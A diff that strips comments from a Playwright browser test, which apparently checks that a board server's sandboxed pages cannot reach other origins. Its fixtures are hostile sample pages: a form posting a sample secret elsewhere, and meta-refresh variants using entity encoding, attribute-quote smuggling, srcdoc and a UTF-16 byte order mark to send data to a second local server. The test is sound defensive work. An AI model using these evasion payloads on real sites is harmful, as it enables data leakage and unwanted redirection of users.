@@ -1,11 +1,3 @@
-// T1001: the board's pages route in a browser. A hostile page cannot fetch the board, read the board's storage, submit
-// a form or reach another server, and runs no script of its own unless the owner opens it with ?scripts=1; a sage
-// message page's Today switch works, but no meta refresh moves a page that holds it (F-T1013-1); the task index links
-// its pages; and a person's click on another site opens a page, while a navigation that no person started does not (F6). It starts the real board server on a free loopback port
-// (never 4173 or 43123) over a SAMPLE logbook and a SAMPLE pages folder in a temporary folder, and a second server on
-// another free port that stands for another site and counts each request that reaches it. It runs in
-// `npm run test:browser`, not in `npm test`, with Playwright's bundled Chromium, or the headless shell at
-// BOARD_BROWSER_PATH; never an installed Chrome.
 import "./test-env.mjs";
 import assert from "node:assert/strict";
 import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
@@ -27,7 +19,6 @@ const HEADERS = ["id title size risk route state branch pr round keys", "id task
 const NAMES = ["tasks", "runs", "findings", "ledger", "gates", "decisions"];
 const LOGBOOK = "project-abcdef";
 
-/** A free loopback port that is not one of the owner's own (4173, 43123). */
 async function freePort() {
   for (;;) {
     const socket = createServer();
@@ -46,15 +37,10 @@ writeFileSync(join(book, "tasks.tsv"), `${HEADERS[0].replaceAll(" ", "\t")}\nT1\
 mkdirSync(pages, { recursive: true });
 
 let browser, board, boardPort, other, otherPort, before_;
-const reached = []; // each request that reaches the other site
-const heard = new Map(); // the headers of each such request, by its address
+const reached = [];
+const heard = new Map();
 const at = (path) => `http://127.0.0.1:${boardPort}/pages/${LOGBOOK}/T1/${path}`;
 
-/**
- * The hostile page: each way to reach the board, the board's storage or another server, done at once by its own
- * script, which also writes what it saw in the page. Without its script, the markup still tries an image, a style, a
- * meta refresh is in its own page below.
- */
 const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile page</title><link rel="stylesheet" href="${other}/style"><script src="${other}/script"></script></head><body>
 <p id="out">no script ran</p><img src="${other}/image" alt=""><img src="/pages/${LOGBOOK}/T1/research.html" alt="">
 <form id="form" method="post" action="${other}/form"><input name="data" value="SAMPLE secret"></form>
@@ -78,7 +64,7 @@ const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile pag
 
 before(async () => {
   boardPort = await freePort(); otherPort = await freePort();
-  const otherSite = `http://localhost:${otherPort}`; // localhost is another site than 127.0.0.1
+  const otherSite = `http://localhost:${otherPort}`;
   writeFileSync(join(pages, "hostile.html"), hostile(otherSite));
   writeFileSync(join(pages, "refresh.html"), `<!DOCTYPE html><title>SAMPLE</title><meta http-equiv="refresh" content="0; url=${otherSite}/refresh?data=SAMPLE"><p>SAMPLE refresh</p>`);
   writeFileSync(join(pages, "research.html"), "<!DOCTYPE html><title>SAMPLE research</title><p>SAMPLE research page</p>");
@@ -88,20 +74,14 @@ before(async () => {
   const message = renderMessage({ ...design, blocks: design.blocks.map((b) => (b.t === "page" ? { ...b, path: `/pages/${b.task}/${b.file}` } : b)) }, { pagePath: (name) => join(pages, name) });
   assert.ok(message.page, "the design message has a page");
   writeFileSync(join(pages, "design.html"), message.page.html);
-  // F-T1013-1: sage's own message page, with its exact switch script, and a meta refresh to the other site added.
   const refresh = (meta) => message.page.html.replace("<title>", `${meta}<title>`);
   writeFileSync(join(pages, "switch-refresh.html"), refresh(`<meta http-equiv="refresh" content="0;url=${otherSite}/switch-refresh?data=SAMPLE">`));
   writeFileSync(join(pages, "switch-odd.html"), refresh(`<META\n  HTTP-EQUIV = 'Refresh' CONTENT='0;url=${otherSite}/switch-odd?data=SAMPLE'>`));
   writeFileSync(join(pages, "switch-entity.html"), refresh(`<meta http-equiv=&#x72;efresh content=0;url=${otherSite}/switch-entity?data=SAMPLE>`));
-  // F-T1013-2: the browser reads the policy-like tag as the value of a, and http-equiv=refresh as the outer meta's.
   writeFileSync(join(pages, "switch-quote.html"), refresh(`<meta a='<meta http-equiv="Content-Security-Policy" content="' http-equiv=refresh content='0;url=${otherSite}/switch-quote?data=SAMPLE'">`));
-  // F-T1013-6: a srcdoc value is decoded and read as a new page, whose refresh moves the frame.
   writeFileSync(join(pages, "switch-srcdoc.html"), refresh(`<iframe srcdoc="&lt;meta http&#45;equiv=&quot;refresh&quot; content=&quot;0;url=${otherSite}/switch-srcdoc?data=SAMPLE&quot;&gt;"></iframe>`));
-  // F-T1013-5: a prerender link in a page with no script.
   writeFileSync(join(pages, "prerender.html"), `<!DOCTYPE html><title>SAMPLE</title><link rel="prerender" href="${otherSite}/prerender?data=SAMPLE"><p>SAMPLE prerender</p>`);
-  // A UTF-16 byte order mark: the browser reads the refresh in UTF-16, while the switch script's bytes stay in UTF-8.
   writeFileSync(join(pages, "switch-utf16.html"), Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<!DOCTYPE html><meta http-equiv="refresh" content="0;url=${otherSite}/switch-utf16?data=SAMPLE"><p>SAMPLE</p>`, "utf16le"), Buffer.from(`<script>${SWITCH_SCRIPT}</script>`)]));
-  // The other site: it counts each request, and serves a page with a link to the board's page and a script that moves to it.
   other = createHttpServer((request, response) => {
     if (request.url === "/" || request.url === "/auto") {
       response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
@@ -126,7 +106,6 @@ after(async () => {
   }
 });
 
-/** A new browser context whose board origin keeps a value in its storage, as the board keeps the owner's theme. */
 async function context(t) {
   const ctx = await browser.newContext();
   t.after(() => ctx.close());
@@ -144,10 +123,9 @@ test("a hostile page runs no script of its own and reaches nothing: no image, st
   assert.match(response.headers()["content-security-policy"], /^sandbox; /);
   assert.equal(await page.locator("#out").textContent(), "no script ran");
   assert.equal(await page.evaluate(() => document.body.dataset.ran ?? "no"), "no");
-  // A meta refresh is no script, but a sandbox without scripts stops it too.
   const refresh = await page.goto(at("refresh.html"));
   assert.equal(refresh.status(), 200);
-  await page.waitForTimeout(500); // the refresh's 0 s, and time for any request to arrive; the page must stay
+  await page.waitForTimeout(500);
   assert.equal(new URL(page.url()).port, String(boardPort), "the refresh did not move the page");
   assert.deepEqual(reached, [], "nothing reached the other site");
 });
@@ -164,9 +142,8 @@ test("with ?scripts=1 a hostile page's own script runs, but it cannot fetch the 
   assert.match(out, /fetch board: TypeError; fetch page: TypeError; fetch other: TypeError/, out);
   assert.match(out, /popup: blocked/, out);
   assert.equal(new URL(page.url()).pathname, `/pages/${LOGBOOK}/T1/hostile.html`, "the form did not move the page");
-  await page.waitForTimeout(500); // time for any request that got out to arrive
+  await page.waitForTimeout(500);
   assert.deepEqual(reached, [], "nothing reached the other site");
-  // The board's own value is still there, in the board's own origin.
   await page.goto(`http://127.0.0.1:${boardPort}/`);
   assert.equal(await page.evaluate(() => localStorage.getItem("sage-sample")), "SAMPLE board value");
 });
@@ -191,23 +168,20 @@ test("F-T1013-1: a page with sage's switch script and a meta refresh, in any spe
     reached.length = 0;
     const response = await page.goto(at(name));
     assert.equal(response.status(), 200, name);
-    await page.waitForTimeout(500); // the refresh's 0 s, and time for any request to arrive; the page must stay
+    await page.waitForTimeout(500);
     assert.deepEqual(reached, [], `${name}: nothing reached the other site`);
     assert.equal(page.url(), at(name), `${name}: the refresh did not move the page`);
     assert.match(response.headers()["content-security-policy"], /^sandbox; /, `${name}: the page runs no script`);
   }
 });
 
-// F-T1013-5: this pins a limit, not a guard. Chromium 140 sends a prerender link's request (NoStatePrefetch), and no
-// header that the board can send stops it (CSP, Permissions-Policy, COOP and COEP, Vary and others were tried). A build
-// without NoStatePrefetch sends none, so the test takes either; the request carries only its address, and the page stays.
 test("F-T1013-5: a prerender link in a page with no script can ask another site for its address, with no referrer, and the page stays", async (t) => {
   const { page } = await context(t);
   reached.length = 0;
   const response = await page.goto(at("prerender.html"));
   assert.match(response.headers()["content-security-policy"], /^sandbox; /);
   for (let i = 0; i < 15 && !reached.length; i++) await page.waitForTimeout(100);
-  await page.waitForTimeout(300); // time for any second request to arrive
+  await page.waitForTimeout(300);
   t.diagnostic(`the prerender request ${reached.length ? "reached" : "did not reach"} the other site in this browser`);
   assert.ok(reached.length === 0 || reached.join() === "/prerender?data=SAMPLE", `only the address of the link: ${reached.join()}`);
   if (reached.length) assert.equal(heard.get(reached[0]).referer, undefined, "no referrer");
@@ -272,7 +246,6 @@ test("the index's warnings are notes that start with Warning, each scripts link 
     const scripts = page.getByRole("link", { name: "Open hostile.html with its scripts", exact: true });
     assert.equal(await scripts.count(), 1, "the scripts link has its page in its name");
     assert.ok((await notes.nth(1).textContent()).includes(`"${await scripts.textContent()}"`), "the warning quotes the link as it reads");
-    // WCAG 2 contrast of each small grey text against the page's own background (the Canvas colour of its scheme).
     const ratios = await page.evaluate(() => {
       const lum = (color) => { const [r, g, b] = color.match(/[\d.]+/g).slice(0, 3).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
       const probe = document.createElement("div");
